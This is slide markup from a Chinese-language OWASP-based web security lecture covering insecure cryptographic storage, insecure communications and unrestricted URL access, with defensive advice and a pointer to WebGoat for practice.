              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4725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E-Commerce</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448526" name="Rectangle 14"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4842" y="2194"/>
              <a:ext cx="726" cy="78"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="008000"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
            <a:scene3d>
              <a:camera prst="legacyPerspectiveTopRight"/>
              <a:lightRig rig="legacyFlat3" dir="b"/>
            </a:scene3d>
            <a:sp3d extrusionH="1801800" prstMaterial="legacyPlastic">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:srgbClr val="008000"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr anchor="ctr">
              <a:flatTx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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>Bus. Functions</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="448527" name="Picture 15" descr="businesswoma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600200"/>
            <a:ext cx="1050925" cy="1255713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pSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 29"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="2743200" y="1773238"/>
            <a:ext cx="3048000" cy="576262"/>
            <a:chOff x="1728" y="1117"/>
            <a:chExt cx="1920" cy="363"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448528" name="Oval 16"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1728" y="1207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8529" name="Rectangle 17"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2064" y="1117"/>
              <a:ext cx="1584" cy="3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 anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr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用户在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Web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表单中填写信用卡号提交 </a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="Group 30"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5562600" y="4221163"/>
            <a:ext cx="3290888" cy="1030287"/>
            <a:chOff x="3504" y="2659"/>
            <a:chExt cx="2073" cy="649"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448530" name="Oval 18"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5280" y="2736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48531" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3504" y="2659"/>
              <a:ext cx="1776" cy="64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 anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr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由于商家的网关不可达，交易失败，错误处理日志 将问题详细记录下来 </a:t>
              </a:r>
              <a:endPara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5" name="Group 32"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1981200" y="3962400"/>
            <a:ext cx="2806700" cy="1122363"/>
            <a:chOff x="1248" y="2496"/>
            <a:chExt cx="1768" cy="707"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448532" name="Oval 20"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1248" y="2544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48533" name="Rectangle 21"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1576" y="2496"/>
              <a:ext cx="1440" cy="70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/>
            <a:lstStyle/>
            <a:p>
              <a:pPr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使用恶意代码从日志文件中偷取数万计的信用卡号 </a:t>
              </a:r>
              <a:endPara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448534" name="Freeform 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-263347">
            <a:off x="2590800" y="2457450"/>
            <a:ext cx="3508375" cy="207963"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="0" y="131"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="1046" y="3"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="2210" y="114"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="2210" h="131">
                <a:moveTo>
                  <a:pt x="0" y="131"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="174" y="110"/>
                  <a:pt x="678" y="6"/>
                  <a:pt x="1046" y="3"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1414" y="0"/>
                  <a:pt x="1968" y="91"/>
                  <a:pt x="2210" y="114"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="57150" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="33CC33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48535" name="AutoShape 23"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6629400" y="3838575"/>
            <a:ext cx="1558925" cy="390525"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartMultidocumen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1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Log files</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="448536" name="Line 24"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7391400" y="3581400"/>
            <a:ext cx="0" cy="2762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" name="Group 31"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3121025" y="5410200"/>
            <a:ext cx="3127375" cy="755650"/>
            <a:chOff x="1966" y="3408"/>
            <a:chExt cx="1970" cy="476"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448537" name="Oval 25"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3639" y="3408"/>
              <a:ext cx="297" cy="235"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="66FF66"/>
            </a:solidFill>
            <a:ln w="9525" algn="ctr">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:rou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400" b="1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48538" name="Rectangle 26"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1966" y="3408"/>
              <a:ext cx="1776" cy="47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/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="20000"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPct val="10000"/>
                </a:spcAft>
                <a:buClr>
                  <a:srgbClr val="FF00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日志文件可被相关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IT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职员访问，用于程序调试 </a:t>
              </a:r>
              <a:endPara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448539" name="Freeform 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5795963" y="5181600"/>
            <a:ext cx="1531937" cy="876300"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="957" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="805" y="463"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="0" y="531"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="965" h="552">
                <a:moveTo>
                  <a:pt x="957" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="932" y="77"/>
                  <a:pt x="965" y="374"/>
                  <a:pt x="805" y="463"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="645" y="552"/>
                  <a:pt x="168" y="517"/>
                  <a:pt x="0" y="531"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:cu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48540" name="Freeform 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="5400000">
            <a:off x="1878807" y="4698206"/>
            <a:ext cx="609600" cy="2033587"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="957" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="805" y="463"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="0" y="531"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="965" h="552">
                <a:moveTo>
                  <a:pt x="957" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="932" y="77"/>
                  <a:pt x="965" y="374"/>
                  <a:pt x="805" y="463"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="645" y="552"/>
                  <a:pt x="168" y="517"/>
                  <a:pt x="0" y="531"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:cu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44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44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4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4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34" grpId="0" animBg="1"/>
      <p:bldP spid="448535" grpId="0" animBg="1"/>
      <p:bldP spid="448536" grpId="0" animBg="1"/>
      <p:bldP spid="448539" grpId="0" animBg="1"/>
      <p:bldP spid="44854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防御不安全的加密存储</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/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如非必要，不要保存敏感信息；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>确保所有的敏感信息都被加密，检查敏感信息的归档过程和政策；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>只使用经过证明的标准加密算法；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>小心存储口令、证书等信息。</a:t>
            </a:r>
          </a:p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8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8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8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8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8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8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8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8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（九）不安全的通信</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="423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435975" cy="424973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en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Applications frequently fail to encrypt network traffic when it is necessary to protect sensitive communications</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2500">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="423941" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="1168400"/>
            <a:ext cx="3763962" cy="579438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20000"/>
              </a:spcBef>
              <a:buFont typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" u="sng">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP Definition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3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不安全的通信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存在的问题</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击者可以从网络上任何一个被攻陷的系统或设备上嗅探网络流量：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>流量往往是不加密的</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>也可能遭受“中间人”攻击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9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9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9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9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9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9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防御不安全通信</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody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1062038"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>保证所有用来认证和传输敏感信息的连接都使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2500">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SSL/TLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2500"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480261" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="2133600"/>
            <a:ext cx="4175125" cy="3816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15000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft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配置服务器和客户端，使用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SSLv3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TLSv1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版本； </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft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为防止“中间人”攻击，只使用经过验证受信任的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SSL/TLS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证书。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="25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80262" name="Picture 6" descr="sna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916113"/>
            <a:ext cx="4105275" cy="42291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0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0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0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0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0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0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（十）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>访问缺少限制</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4249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435975" cy="424973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en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Frequently, an application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only protects sensitive functionality by preventing the display of links or URLs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> to unauthorized users. Attackers can use this weakness to access and perform unauthorized operations by accessing those URLs directly.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="424965" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="1168400"/>
            <a:ext cx="3763962" cy="579438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20000"/>
              </a:spcBef>
              <a:buFont typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" u="sng">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP Definition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4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</a:rPr>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>访问缺少限制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1" y="1373188"/>
            <a:ext cx="8296274" cy="4818062"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>当</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>应用缺少对某些</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>的访问限制，攻击者可以直接在浏览器中输入</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>来访问。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>比如：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Add_account_form.php  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>在显示这个表单页时要先对用户的管理员角色进行验证；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>表单填好后发送给</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>add_acct.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>执行添加帐号的功能；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如果不限制</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>add_acct.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的直接访问，攻击者直接在浏览器中访问该页面，就绕过了权限检查。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防御缺少限制的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>访问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2016125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400"/>
              <a:t>从需求阶段就要制定详细的安全策略；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400"/>
              <a:t>从页面到每一个功能，都只由相应的经过认证的角色来访问；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400"/>
              <a:t>访问控制策略越简单越好。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="482308" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2579688" y="1214438"/>
            <a:ext cx="2324100" cy="519112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2" charset="-122"/>
              </a:rPr>
              <a:t>从早期做起！</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="482309" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2684463" y="3702050"/>
            <a:ext cx="2324100" cy="519113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2" charset="-122"/>
              </a:rPr>
              <a:t>彻底地测试！</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="482310" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="4365625"/>
            <a:ext cx="8229600" cy="2016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15000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft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进行详尽地测试保证访问控制没有被旁路；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft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尝试所有的非法访问；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft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测试时不要跟随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Web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应用的正常工作流；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2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2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2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2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2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82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82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8" grpId="0"/>
      <p:bldP spid="482309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应用的安全起始于体系结构和设计；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>除非重设计和重编码，“打补丁</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>解决不了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全问题；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>惯用的安全管理方法往往防御不了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全漏洞；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>不要发明创造自己的安全管理方法；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Design, Design, Design, Code, Test, Test, Test</a:t>
            </a:r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6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6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6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6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6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6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6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6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6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6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</a:rPr>
              <a:t>跟着</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>WebGoat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>一起学习</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="440325" name="Picture 5" descr="sna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5488" y="925513"/>
            <a:ext cx="8167687" cy="5680075"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="440326" name="AutoShape 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2411413" y="5157788"/>
            <a:ext cx="1223962" cy="719137"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -54412"/>
              <a:gd name="adj2" fmla="val -116005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各种攻击方法选择</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="440327" name="AutoShape 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
